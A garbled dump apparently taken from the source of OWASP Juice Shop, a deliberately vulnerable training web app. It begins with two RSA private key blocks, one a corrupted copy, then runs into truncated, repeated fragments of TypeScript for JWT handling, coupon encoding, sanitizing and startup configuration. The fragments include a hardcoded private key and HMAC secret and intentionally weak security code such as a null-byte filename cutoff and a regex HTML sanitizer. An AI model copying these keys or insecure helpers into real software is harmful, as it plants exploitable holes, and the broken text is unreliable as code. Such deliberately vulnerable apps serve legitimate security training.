MIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTISzbQ5FBVPVmhnYhG/kpwt/cIxK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQcDHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0TcseFRfewXAa/ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fqFt2LXbLtyg6wZyxMA/cnmt5Nt3U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfUYLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2enqqObahDHB5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinrutZms87Jyi+D8Br8NY0+Nlf+zHvXAomD2W5CsEK7C+8SLBr3k/TsnRWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWkZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00Ga/xt+7+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=
-----END RSA PRIVATE KEY----------BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQDNwqLEe9wgTXCbCRPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTISzbQ5FBVPVmhnYhG/kpwt/cIxK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQcDHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0TcseFRfewXAa/ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEfqFt2LXbLtyg6wZyxMA/cnmt5Nt3U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfUYLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2enqqObahDHB5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCkwUgHinrutZms87Jyi+D8Br8NY0+Nlf+zHvXAomD2W5CsEK78SLBr3k/TsnRWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWkZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+Uv4lD7uYBw00Ga/xt+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=
-----END RSA PRIVATE KEY-----data: UserModeliat: numberexp: numbertokenMa ... thUser>Record< ... thUser>idMap:  ... string>Record< ... string>put: (t ... => void(token: ... => voidget: (t ... defined(token: ... definedRespons ... definedtokenOf ... defined(user:  ... definedstring | undefinedfrom: ( ... defined(req: R ... definedupdateF ...  => any(req: R ...  => anyexport  ... ('hex')const h ... ('hex')hash =  ... ('hex')(data:  ... ('hex')crypto. ... ('hex')crypto. ... e(data)hmac =  ... ('hex')crypto. ... Ztwmj')sha256'pa4qac ... yZtwmj'pa4qacea4VK9t9nGv7yZtwmjexport  ...  str\r\n}const c ...  str\r\n}cutOffP ...  str\r\n}(str: s ...  str\r\n}{\r\n  co ...  str\r\n}const n ... = '%00'nullByte = '%00'%00if (uti ... ))\r\n  }utils.c ... llByte)utils.containsreturn  ... lByte))str.sub ... lByte))str.substringstr.ind ... llByte)str.indexOfreturn strexport  ... as any)const i ... as any)isAutho ... as any)() => e ... as any)express ... as any)({ secr ...  as any({ secr ... cKey }){ secre ... icKey }secret: publicKeyconst d ... as any)denyAll ... as any){ secre ...  as any{ secre ... dom() }secret: ... andom()'' + Math.random()export  ... 256' })const a ... 256' })authori ... 256' })(user = ... 256' })jwt.sig ... 256' })jwt.sign{ expir ... S256' }expiresIn: '6h'6halgorithm: 'RS256'RS256export  ... : falseconst v ... : falseverify  ... : false(token: ... : falsetoken ? ... : false(jws.ve ... licKey)(jws.ve ... olean))jws.ver ... oolean)jws.verify((token ... oolean)(token: ... booleanexport  ... yload }const d ... yload }decode  ... yload }(token: ... yload }{ retur ... yload }return  ... payloadjws.dec ... payloadjws.decode(token)jws.decodeexport  ... b(html)const s ... b(html)sanitiz ... b(html)(html:  ... b(html)export  ... gi, '')const s ... gi, '')sanitiz ... gi, '')(input  ... gi, '')input.r ... gi, '')input.replace<(?:\w+)\W+?[\w](?:\w+)\W+?\W[\w]export  ... lename)const s ... lename)sanitiz ... lename)(filena ... lename)sanitiz ... \n  }\r\n}(html:  ... \n  }\r\n}const s ... l(html)sanitiz ... l(html)sanitizeHtml(html)if (san ... d)\r\n  }sanitized === html{\r\n     ... ml\r\n  }return htmlreturn  ... itized)sanitiz ... itized)const a ... \n  }\r\n}authent ... \n  }\r\n}{\r\n  to ... \n  }\r\n}tokenMap: {}idMap: {}put: fu ... en\r\n  }functio ... en\r\n  }{\r\n     ... en\r\n  }this.to ...  = userthis.tokenMap[token]this.tokenMapthis.id ... = tokenthis.id ... ata.id]this.idMapuser.data.idget: fu ... ed\r\n  }functio ... ed\r\n  }token ? ... definedthis.to ... token)]utils.unquote(token)utils.unquotetokenOf ... ed\r\n  }user ?  ... definedthis.idMap[user.id]from: f ... ed\r\n  }const t ... om(req)token = ... om(req)utils.jwtFrom(req)utils.jwtFromthis.get(token)this.getupdateF ... r)\r\n  }functio ... r)\r\n  }this.pu ... , user)this.putconst u ... ined\r\n}userEma ... ined\r\n}({ head ... ined\r\n}{ headers }headers ... definedheaders ... email']x-user-emailexport  ... pon)\r\n}const g ... pon)\r\n}generat ... pon)\r\n}(discou ... pon)\r\n}{\r\n  co ... pon)\r\n}const c ... iscountcoupon  ... iscountutils.t ... iscountutils.t ... ) + '-'utils.toMMMYY(date)utils.toMMMYYreturn  ... coupon)z85.encode(coupon)z85.encodeconst d ... ined\r\n}discoun ... ined\r\n}(coupon ... ined\r\n}{\r\n  if ... ined\r\n}if (cou ...  }\r\n  }const d ... coupon)decoded ... coupon)z85.decode(coupon)z85.decodeif (dec ... \r\n    }decoded ... = null)(hasVal ... = null)hasVali ... != nullhasVali ... ring())decoded.toString()decoded.toStringconst p ... it('-')parts = ... it('-')decoded ... it('-')decoded ... ).splitconst v ... arts[0]validity = parts[0]parts[0]utils.t ... alidityutils.t ... Date())const d ... arts[1]discount = parts[1]parts[1]parseInt(discount)return undefinedfunctio ... 2}/)\r\n}{\r\n  re ... 2}/)\r\n}return  ... 9]{2}/)coupon. ... 9]{2}/)coupon.match/(JAN|F ... -9]{2}/(JAN|FEB|MAR|APR|MAY|JUN|JUL|AUG|SEP|OCT|NOV|DEC)[0-9]{2}-[0-9]{2}(JAN|FEB|MAR|APR|MAY|JUN|JUL|AUG|SEP|OCT|NOV|DEC)JAN|FEB|MAR|APR|MAY|JUN|JUL|AUG|SEP|OCT|NOV|DECJANFEBMARAPRMAYJUNJULAUGSEPOCTNOVDEC[0-9]{2}[0-9]for (co ... ge\r\n  }export  ... ex')\r\n}const d ... ex')\r\n}deluxeT ... ex')\r\n}(email: ... ex')\r\n}{\r\n  co ... ex')\r\n}const h ... ateKey)hmac =  ... ateKey)crypto. ... ateKey)return  ... ('hex')hmac.up ... ('hex')hmac.up ... .digesthmac.up ... deluxe)hmac.updateemail + roles.deluxeconst i ... \n  }\r\n}isAccou ... \n  }\r\n}() => { ... \n  }\r\n}(req: R ...  }\r\n  }const d ... m(req))decoded ... m(req))verify( ... m(req))decode( ... m(req))decoded ... ountingdecoded ... a?.roledecodedToken?.datares.sta ... ted' })res.status(403).jsonres.status(403){ error ... cted' }error:  ... tected''Malici ... tected'Malicious activity detectedexport  ... ail)\r\n}const i ... ail)\r\n}isDelux ... ail)\r\n}(req: R ... ail)\r\n}{\r\n  co ... ail)\r\n}return  ... .email)decoded ... .email)decoded ... xeTokendecoded ... .deluxedeluxeT ... .email)decoded ... ?.emailexport  ... omer\r\n}const i ... omer\r\n}isCusto ... omer\r\n}(req: R ... omer\r\n}{\r\n  co ... omer\r\n}return  ... ustomerdecoded ... ustomerroles.customerappendU ... \n  }\r\n}req.bod ... data.idreq.body.UserIdauthent ... data.idauthent ... )].dataauthent ... m(req)]authent ... okenMapres.sta ... rror })res.status(401).jsonres.status(401){ statu ... error }status: 'error'message: errorconst u ... xt()\r\n}updateA ... xt()\r\n}updateA ... edUsers(req: R ... xt()\r\n}{\r\n  co ... xt()\r\n}req.coo ... om(req)req.cookies.tokenreq.cookiesif (tok ... })\r\n  }jwt.ver ... \n    })jwt.verifyError | nullerr === nullauthent ... definedauthent ... (token)authent ... ers.getauthent ... ecoded)authent ... ers.putres.coo ...  token)res.cookieP:/My Drive/Git/juice-shop/lib/is-docker.ts from https://github.com/sindresorhus/is-docker/tree/main MIT Licensed// from ... icensed inlined to avoid import problems in cypress// inli ... cypress TODO: Use `??=` when targeting Node.js 16.// TODO ... .js 16.isDockerCachedhasDockerEnv'/.dockerenv'hasDockerCGroup'/proc/self/cgroup'let isD ... definedisDocke ... definedboolean | undefined{\r\n  tr ... \n  }\r\n}try {\r\n ... se\r\n  }fs.stat ... erenv')/.dockerenvdockerenvcatch { ... se\r\n  }return  ... ocker')fs.read ... ocker')fs.read ... ncludes/proc/self/cgroupexport  ... ched\r\n}functio ... ched\r\n}{\r\n  // ... ched\r\n}if (isD ... ()\r\n  }isDocke ... Group()hasDock ... Group()hasDockerEnv()hasDockerCGroup()return  ... rCachedP:/My Drive/Git/juice-shop/lib/is-heroku.ts from https://github.com/sindresorhus/is-heroku/tree/main MIT Licensed'HEROKU''DYNO'HOME'/app'export  ... '/app')() => ' ... '/app')'HEROKU ... '/app')'HEROKU ... ess.envHEROKU('DYNO' ... '/app')'DYNO'  ...  '/app''DYNO'  ... ess.envDYNOprocess ...  '/app'process.env.HOMEP:/My Drive/Git/juice-shop/lib/is-windows.ts from https://github.com/jonschlinkert/is-windows MIT Licensed'win32'/^(msys|cygwin)$/OSTYPEexport  ... ''))\r\n}functio ... ''))\r\n}{\r\n  re ... ''))\r\n}return  ... ?? ''))process ... ?? ''))(proces ... ?? ''))process ...  ?? '')process ... 'win32'process.platform/^(msys ...  ?? '')/^(msys ... $/.test^(msys|cygwin)$(msys|cygwin)msys|cygwinmsyscygwinprocess ... E ?? ''process.env.OSTYPEP:/My Drive/Git/juice-shop/lib/logger.tswinston'winston'createLoggertransports'test''info'simpleimport  ... inston'* as winstonexport  ... e()\r\n})winston ... e()\r\n})winston.createLogger{\r\n  tr ... le()\r\n}transpo ... })\r\n  ]new win ... nfo' })winston ... Consolewinston.transports{ level ... info' }level:  ...  'info'process ...  'info'process ...  'test'process.env.NODE_ENVformat: ... imple()winston ... imple()winston ... .simplewinston.formatP:/My Drive/Git/juice-shop/lib/noUpdate.ts Credit for the implementation in JS: https://github.com/daviddossantos/sequelize-notupdate-attributes// Cred ... ributes @ts-expect-error FIXME due to non-existing type definitions for sequelize/lib/errors// @ts- ... /errorsModelValidationErrorItemType'sequelize/types'ValidationOptions'sequelize/types/instance-validator'ValidationErrorValidationErrorItem'sequelize/lib/errors'ExtendedValidationOptionsvalidateExtendedModel_changedArrayLikerawAttributes_previousDataValuesmakeKeyNonUpdatableaddHook'beforeValidate'instanceisNewRecordchangedKeysinstanceChangedvalidationErrorsfieldNamefieldDefinition`\`${}\` cannot be updated due \`noUpdate\` constraint`'noUpdate Violation'sequelize/typestype Modeltype Va ... temTypeValidat ... temType'sequel ... idator'sequelize/types/instance-validatortype Va ... Optionsimport  ... errors''sequel ... errors'sequelize/lib/errorsExtende ... Optionsvalidate: booleaninterfa ... ull>\r\n}_change ... string>Iterabl ... string>Iterable<string>ArrayLike<string>rawAttr ... g, any>_previo ... , null>Record<string, null>const m ...   })\r\n}makeKey ...   })\r\n}(model: ...   })\r\n}{\r\n  mo ...   })\r\n}model.a ... }\r\n  })model.addHookbeforeValidate(instan ...  }\r\n  }if (!op ...  return!options.validateoptions.validateif (ins ...  returninstance.isNewRecordconst c ... [] = []changed ... [] = []unknown[]const i ... hanged)instanc ... hanged)Array.f ... hanged)instance._changedinstanc ... value))instanc ... forEach(value) ... (value)changed ... (value)changedKeys.pushif (cha ...  returnchanged ... h === 0changedKeys.lengthconst v ... [] = []validat ... [] = []Validat ... mType[]changed ... \n    })changedKeys.forEach(fieldN ... \r\n    }const f ... ldName]fieldDe ... ldName]instanc ... ldName]instanc ... ributesinstanc ... column)instanc ... == nullinstanc ... definedinstanc ... aValues(fieldD ... column)fieldDe ...  columnfieldDe ... eldNamevalidat ...       )validat ... rs.pushnew Val ...       )`\`${fi ... traint`\\` cann ... straint` cannot be updated due `noUpdate` constraint\` cannot be updated due \`noUpdate\` constraintnoUpdate Violationif (val ... rors) }validat ... gth > 0validat ... .length{ throw ... rors) }throw n ... Errors)new Val ... Errors)P:/My Drive/Git/juice-shop/lib/startup/cleanupFtpFolder.tsP:/My Drive/Git/juice-shop/lib/startupglob'glob''../logger''fs-extra''../utils'cleanupFtpFolder'ftp/*.pdf''Error listing PDF files in /ftp folder: 'import  ...  'glob'../loggerimport  ... -extra'fs-extra../utilsconst c ... \n  }\r\n}cleanup ... \n  }\r\n}try {\r\n ... ))\r\n  }const f ... *.pdf')files = ... *.pdf')await g ... *.pdf')glob('ftp/*.pdf')ftp/*.pdfconst filenameawait f ... lename)fs.remove(filename)fs.removecatch ( ... ))\r\n  }logger. ... e(err))'Error  ... ge(err)'Error  ... lder: 'Error listing PDF files in /ftp folder: export  ... pFolderP:/My Drive/Git/juice-shop/lib/startup/customizeApplication.ts @ts-expect-error FIXME due to non-existing type definitions for replace// @ts- ... replacecustomizeApplicationcustomizeTitle'application.logo'customizeLogo'application.favicon'customizeFavicon'application.theme'customizeTheme'application.cookieConsent'customizeCookieConsentBanner'application.promotion'customizePromotionVideocustomizePromotionSubtitles'hackingInstructor'customizeHackingInstructorAvatar'application.chatBot'customizeChatbotAvatarretrieveCustomFile'frontend/dist/frontend/assets/public/images''application.chatBot.avatar'copyFileSync'frontend/dist/frontend/assets/public/images/''frontend/dist/frontend/assets/public/images/ChatbotAvatar.png''hackingInstructor.avatarImage''frontend/dist/frontend/assets/public/images/hackingInstructor.png''frontend/dist/frontend/assets/public'/type="image\/x-icon" href="assets\/public\/.*"/`type="image/x-icon" href="assets/public/${'frontend/dist/frontend/index.html''application.promotion.video''frontend/dist/frontend/assets/public/videos''application.promotion.subtitles'sourcePropertydestinationFolder`<title>${}</title>`/<title>.*<\/title>/bodyClass'"mat-app-background ''-theme"'/"mat-app-background .*-theme"/contentProperty'"content": { "message": "''application.cookieConsent.message''", "dismiss": "''application.cookieConsent.dismissText''", "link": "''application.cookieConsent.linkText''", "href": "''application.cookieConsent.linkUrl''" }'/"content": { "message": ".*", "dismiss": ".*", "link": ".*", "href": ".*" }/import  ... eplace'customi ... \n  }\r\n}if (con ... ()\r\n  }customizeTitle()config. ... .logo')application.logovoid customizeLogo()customizeLogo()config. ... vicon')'applic ... avicon'application.faviconvoid cu ... vicon()customizeFavicon()config. ... theme')application.themecustomizeTheme()config. ... nsent')'applic ... onsent'application.cookieConsentcustomi ... anner()customi ... tBannerconfig. ... otion')'applic ... motion'application.promotionvoid cu ... Video()customi ... Video()customi ... onVideovoid cu ... itles()customi ... itles()customi ... btitlesconfig. ... uctor')void cu ... vatar()customi ... vatar()customi ... rAvatarconfig. ... atBot')'applic ... hatBot'application.chatBotcustomi ... tAvatarconst c ... es')\r\n}customi ... es')\r\n}async ( ... es')\r\n}{\r\n  aw ... es')\r\n}await r ... mages')retriev ... mages')'fronte ... images'frontend/dist/frontend/assets/public/imagesconst c ... ng')\r\n}customi ... ng')\r\n}async ( ... ng')\r\n}{\r\n  co ... ng')\r\n}const a ... mages')avatarI ... mages')'applic ... avatar'application.chatBot.avatarfs.copy ... r.png')fs.copyFileSync'fronte ... arImage'fronte ... mages/'frontend/dist/frontend/assets/public/images/'fronte ... ar.png'frontend/dist/frontend/assets/public/images/ChatbotAvatar.pngfrontend/dist/frontend/assets/public/images/ChatbotAvatar'hackin ... rImage'hackingInstructor.avatarImage'fronte ... or.png'frontend/dist/frontend/assets/public/images/hackingInstructor.pngfrontend/dist/frontend/assets/public/images/hackingInstructorconst c ...   })\r\n}customi ...   })\r\n}async ( ...   })\r\n}const f ... ublic')favicon ... ublic')await r ... ublic')retriev ... ublic')'fronte ... public'frontend/dist/frontend/assets/publicregex:  ... c\/.*"//type=" ... c\/.*"/type="image\/x-icon" href="assets\/public\/.*"type="image\/x-icon" href="assetsreplace ... icon}"``type=" ... icon}"`type="i ... public/type="image/x-icon" href="assets/public/paths:  ... .html']['front ... .html']'fronte ... x.html'frontend/dist/frontend/index.htmlfrontend/dist/frontend/indexrecursive: falseconst c ... os')\r\n}customi ... os')\r\n}async ( ... os')\r\n}{\r\n  aw ... os')\r\n}await r ... ideos')retriev ... ideos')'applic ... .video'application.promotion.video'fronte ... videos'frontend/dist/frontend/assets/public/videos'applic ... titles'application.promotion.subtitlesconst r ... file\r\n}retriev ... file\r\n}async ( ... file\r\n}{\r\n  le ... file\r\n}let fil ... operty)file =  ... operty)config. ... operty)if (uti ... e)\r\n  }utils.isUrl(file)const f ...  = filefilePath = filefile =  ... e(file)utils.e ... e(file)await u ... + file)utils.d ... + file)destina ...  + filedestina ... r + '/'return fileconst t ... title>`title = ... title>``<title ... title>`<title></title>regex:  ... title>/<title>.*<\/title>title>replacement: titleconst b ... theme"'bodyCla ... theme"''"mat-a ... theme"''"mat-a ... theme')'"mat-a ... round '"mat-app-background -theme"regex:  ... theme"//"mat-a ... theme"/"mat-app-background .*-theme"replace ... dyClassconst c ... + '" }'content ... + '" }''"conte ... + '" }''"conte ... nkUrl')'"conte ... ef": "''"conte ... kText')'"conte ... nk": "''"conte ... sText')'"conte ... ss": "''"conte ... ssage')'"conte ... ge": "'"content": { "message": "config. ... ssage')'applic ... essage'application.cookieConsent.message", "dismiss": "config. ... sText')'applic ... ssText'application.cookieConsent.dismissText", "link": "config. ... kText')'applic ... nkText'application.cookieConsent.linkText", "href": "config. ... nkUrl')'applic ... inkUrl'application.cookieConsent.linkUrl" }regex:  ... ".*" }//"conte ... ".*" }/"content": { "message": ".*", "dismiss": ".*", "link": ".*", "href": ".*" }"content": "message": "" expected digitunexpected characterreplace ... ropertyexport  ... icationP:/My Drive/Git/juice-shop/lib/startup/customizeEasterEgg.tscustomizeEasterEgg'application.easterEggPlanet.overlayMap'overlayPath'frontend/dist/frontend/assets/private/'replaceImagePath'application.easterEggPlanet.name'replaceThreeJsTitleTagtextureDeclaration'orangeTexture = THREE.ImageUtils.loadTexture("/assets/private/''");'/orangeTexture = .*;/'frontend/dist/frontend/assets/private/threejs-demo.html'threeJsTitleTag'<title>Welcome to Planet ''</title>'if (con ... y)\r\n  }config. ... ayMap')config.has'applic ... layMap'application.easterEggPlanet.overlayMaplet ove ... ayMap')overlay ... ayMap')utils.isUrl(overlay)const o ... overlayoverlay ... overlayoverlay ... verlay)utils.e ... verlay)await u ... verlay)utils.d ... verlay)'fronte ... overlay'fronte ... ivate/'frontend/dist/frontend/assets/private/replace ... verlay)'applic ... t.name'application.easterEggPlanet.namereplace ... leTag()replace ... itleTagconst r ...   })\r\n}replace ...   })\r\n}(overla ...   })\r\n}const t ... + '");'texture ... + '");''orange ... + '");''orange ... overlay'orange ... ivate/'orangeTexture = THREE.ImageUtils.loadTexture("/assets/private/");regex:  ...  = .*;//orange ...  = .*;/orangeTexture = .*;orangeTexture = replace ... aration'fronte ... o.html'frontend/dist/frontend/assets/private/threejs-demo.htmlfrontend/dist/frontend/assets/private/threejs-democonst t ... title>'threeJs ... title>''<title ... title>''<title ... .name')'<title ... lanet '<title>Welcome to Planet export  ... sterEggP:/My Drive/Git/juice-shop/lib/startup/registerWebsocketEvents.ts @ts-expect-error FIXME Type safety issue when setting global socket-io object// @ts- ...  object'../../data/datacache''../challengeUtils''../insecurity'firstConnectedSocket'http://localhost:4200''connection'/.*\.\.\/\.\.\/\.\.[\w/-]*?\/redirect\?to=https?:\/\/placekitten.com\/(g\/)?[\d]+\/[\d]+.*/'../../ ... acache'../../data/datacache../challengeUtils../insecuritylet fir ...  = nullfirstCo ...  = nullregiste ...   })\r\n}(server ...   })\r\n}const i ... 0' } })io = ne ... 0' } })new Ser ... 0' } }){ cors: ... 00' } }cors: { ... 4200' }{ origi ... 4200' }origin: ... t:4200'globalW ... io = ioio.on(' ... )\r\n  })io.on(socket ... })\r\n  }if (fir ... \r\n    }firstCo ... == nullsocket. ... arted')socket.emitfirstCo ... cket.idsocket.idnotific ... \n    })notific ... forEach(notifi ... \r\n    }socket. ... cation)socket. ... \n    })socket.onconst i ... = data)i = not ... = data)notific ... = data)notific ... ndIndex({ flag ... == data{ flag }flag === dataif (i > ...       }i > -1notific ... e(i, 1)notifications.splicechallen ... ">') })() => { ... )">') }{ retur ... )">') }return  ... s`)">')utils.c ... s`)">')challen ... d')) })() => { ... ad')) }{ retur ... ad')) }return  ... load'))utils.c ... load'))challen ... ata) })() => { ... data) }{ retur ... data) }return  ... d(data)data?.m ... d(data)data?.m ... d]+.*/)data?.match/.*\.\. ... \d]+.*/.*\.\.\/\.\.\/\.\.[\w/-]*?\/redirect\?to=https?:\/\/placekitten.com\/(g\/)?[\d]+\/[\d]+.*[\w/-]*?[\w/-]\?to=httpplacekitten(g\/)?(g\/)g\/[\d]+securit ... d(data)securit ... Allowedchallen ...  > 1 })() => { ... h > 1 }{ retur ... h > 1 }return  ... gth > 1Array.i ... gth > 1Array.isArray(data)data.length > 1data.lengthexport  ... tEventsP:/My Drive/Git/juice-shop/lib/startup/restoreOverwrittenFilesWithOriginals.tscopyFilerestoreOverwrittenFilesWithOriginals'data/static/legal.md''ftp/legal.md''frontend/dist''data/static/owasp_promo.vtt''frontend/dist/frontend/assets/public/videos/owasp_promo.vtt''data/static/i18n/*.json''i18n/''Error listing JSON files in /data/static/i18n folder: 'const e ...  false)exists  ...  false)async ( ...  false)await a ...  false)access( ...  false)access( ... ).catchaccess( ... > true)access(path).thenaccess(path)() => true() => falseconst r ... \n  }\r\n}restore ... \n  }\r\n}restore ... iginals{\r\n  aw ... \n  }\r\n}await c ... l.md'))copyFil ... l.md'))path.re ... al.md')'data/s ... gal.md'data/static/legal.mddata/static/legalftp/legalif (awa ...  )\r\n  }await e ... dist'))exists( ... dist'))path.re ... /dist')frontend/distawait c ... \r\n    )copyFil ... \r\n    )path.re ... o.vtt')'data/s ... mo.vtt'data/static/owasp_promo.vttdata/static/owasp_promovtt'fronte ... mo.vtt'frontend/dist/frontend/assets/public/videos/owasp_promo.vttfrontend/dist/frontend/assets/public/videos/owasp_promoconst f ... json'))files = ... json'))await g ... json'))glob(pa ... json'))path.re ... .json')data/static/i18nawait P ... \r\n    )Promise ... \r\n    )files.m ...      })await c ...  + 1)))copyFil ...  + 1)))path.re ... ) + 1))filenam ... ') + 1)filename.substringfilenam ... /') + 1filenam ... Of('/')filename.lastIndexOfError listing JSON files in /data/static/i18n folder: export  ... iginalsP:/My Drive/Git/juice-shop/lib/startup/validateChatBot.tsvalidateChatBotexitOnFailurecheckIntentWithFunctionHandlerExists'couponCode''queries.productPrice''productPrice''queries.functionTest''testFunction'`Chatbot training data ${} validated (${'OK''NOT OK'`Visit ${'https://pwning.owasp-juice.shop/appendix/chatbot.html'} for the training data schema definition.`'Exiting due to configuration errors!'intentData`Intent ${italic} is missing in chatbot training data (${answers`Answer with ${} action and handler ${} is missing for intent ${export  ... cess\r\n}functio ... cess\r\n}{\r\n  le ... cess\r\n}let success = truesuccess = truesuccess ... successcheckIn ... successcheckIn ... nCode')checkIn ... rExistscheckIn ... Price')'querie ... tPrice'queries.productPricecheckIn ... ction')'querie ... onTest'queries.functionTestfunctionTestif (suc ...  }\r\n  }logger. ... K')})`)`Chatbo ... OK')})`Chatbot ... g data Chatbot training data colors. ... ata')))utils.e ... Data')) validated (colors.green('OK')OKcolors.red('NOT OK')NOT OKlogger. ... tion.`)`Visit  ... ition.`Visit colors. ... .html')https://pwning.owasp-juice.shop/appendix/chatbot.htmlshop/appendix/chatbot for th ... nition. for the training data schema definition.if (exi ... \r\n    }logger. ... ors!'))colors. ... rors!')'Exitin ... rrors!'Exiting due to configuration errors!process.exit(1)return successconst c ... cess\r\n}checkIn ... cess\r\n}(traini ... cess\r\n}const i ... intent)intentD ... intent)trainin ... intent)(data:  ...  intentdata.in ...  intentif (int ...  }\r\n  }intentD ... h === 0intentData.length`Intent ... OK')})`Intent colors. ... intent)colors.italic is mis ...  data ( is missing in chatbot training data (success = falseif (int ... \r\n    }intentD ... .lengthintentD ... andler)intentD ... .filterintentD ... answersintentData[0](answer ... handler{ actio ... tring }action: string,handler: stringanswer. ... handleranswer. ... nction'answer.actionanswer.handler`Answer ... OK')})`Answer with colors. ... ction') action and handler colors. ... andler) is mis ... intent  is missing for intent P:/My Drive/Git/juice-shop/lib/startup/validateConfig.ts @ts-expect-error FIXME due to non-existing type definitions for yaml-schema-validator// @ts- ... lidator @ts-expect-error FIXME Ignoring any type issue on purpose// @ts- ... purpose @ts-expect-error FIXME implicit any type issue// @ts- ... e issue @ts-expect-error FIXME any type issue'process''../config.types'validateSchema'yaml-schema-validator/src'specialProducts'"Christmas Special" challenge product''useForChristmasSpecialChallenge''"Product Tampering" challenge product''urlForProductTamperingChallenge''"Retrieve Blueprint" challenge product''fileForRetrieveBlueprintChallenge'extra'exifForBlueprintChallenge''list of EXIF metadata properties''"Leaked Unsafe Product" challenge product''keywordsForPastebinDataLeakChallenge'specialMemories'"Meta Geo Stalking" challenge memory''geoStalkingMetaSecurityQuestion''geoStalkingMetaSecurityAnswer''"Visual Geo Stalking" challenge memory''geoStalkingVisualSecurityQuestion''geoStalkingVisualSecurityAnswer'validateConfigcheckYamlSchemacheckMinimumRequiredNumberOfProductscheckUnambiguousMandatorySpecialProductscheckUniqueSpecialOnProductscheckNecessaryExtraKeysOnSpecialProductscheckMinimumRequiredNumberOfMemoriescheckUnambiguousMandatorySpecialMemoriescheckUniqueSpecialOnMemoriescheckSpecialMemoriesHaveNoUserAssociatedcheckForIllogicalCombos`Configuration ${'default''https://pwning.owasp-juice.shop/part1/customization.html#yaml-configuration-file'} for the configuration schema definition.`toObjectschemaErrorsschemaPath`Config schema validation failed with ${} errors (${`Only ${} products are configured but at least four are required (${matchingProducts`No product is configured as ${} but one is required (${} products are configured as ${} but only one is allowed (${`Product ${} configured as ${} does't contain necessary ${appliedSpecials} is used as ${} but can only be used for one challenge (${} memories are configured but at least two are required (${matchingMemories`No memory is configured as ${} memories are configured as ${`Memory configured as ${} must belong to user ${} but was linked to ${'unknown'} user (${`Memory ${`Restricted tutorial mode is enabled while Hacking Instructor is disabled (${`CTF flags are enabled while challenge solved notifications are disabled (${`CTF country mappings for FBCTF are enabled while CTF flags are disabled (${import  ... rocess'../config.types/configimport  ... or/src''yaml-s ... or/src'yaml-schema-validator/srcconst s ... e' }\r\n]special ... e' }\r\n][\r\n  {  ... e' }\r\n]{ name: ... enge' }'"Chris ... roduct'"Christmas Special" challenge productkey: 'u ... llenge''useFor ... llenge''"Produ ... roduct'"Product Tampering" challenge product'urlFor ... llenge'{ name: ... es' } }'"Retri ... roduct'"Retrieve Blueprint" challenge productkey: 'f ... llenge''fileFo ... llenge'extra:  ... ties' }{ key:  ... ties' }key: 'e ... llenge''exifFo ... llenge'name: ' ... erties''list o ... erties'list of EXIF metadata properties'"Leake ... roduct'"Leaked Unsafe Product" challenge productkey: 'k ... llenge''keywor ... llenge'const s ... s constspecial ... s const[\r\n  {  ... s const[\r\n  {  ... '] }\r\n]{ name: ... wer'] }name: ' ... memory''"Meta  ... memory'"Meta Geo Stalking" challenge memoryuser: 'john'keys: [ ... nswer']['geoSt ... nswer']'geoSta ... estion''geoSta ... Answer''"Visua ... memory'"Visual Geo Stalking" challenge memoryuser: 'emma'const v ... cess\r\n}validat ... cess\r\n}async ( ... cess\r\n}{ produ ...  true }exitOnFailure = true{ produ ... olean }product ... nfig[],memorie ... nfig[],exitOnF ... boolean{\r\n  pr ... cess\r\n}product ... ) ?? []memorie ... ) ?? []memorie ... ories')checkYa ... successcheckYamlSchema()checkMi ... successcheckMi ... oducts)checkMi ... roductscheckUn ... successcheckUn ... oducts)checkUn ... roductscheckNe ... successcheckNe ... oducts)checkNe ... roductscheckMi ... mories)checkMi ... emoriescheckUn ... mories)checkUn ... emoriescheckSp ... successcheckSp ... mories)checkSp ... ociatedcheckFo ... successcheckFo ... ombos()checkFo ... lCombos`Config ... OK')})`Configuration colors. ... fault')process ... efault'colors. ... -file')'https: ... n-file'https://pwning.owasp-juice.shop/part1/customization.html#yaml-configuration-fileshop/part1/customizationhtml#yaml-configuration-file for the configuration schema definition.checkYa ... cess\r\n}(config ... cess\r\n}config. ... bject()config.util.toObjectconfig.utilconst s ... one' })schemaE ... one' })validat ... one' }){ schem ... none' }schemaP ... a.yml')path.re ... a.yml')logLevel: 'none'if (sch ... se\r\n  }schemaE ... h !== 0schemaErrors.lengthConfig  ... d with Config schema validation failed with  errors (schemaE ... \n    })schemaErrors.forEach({ path ... \r\n    }{ path, message }{ path: ... 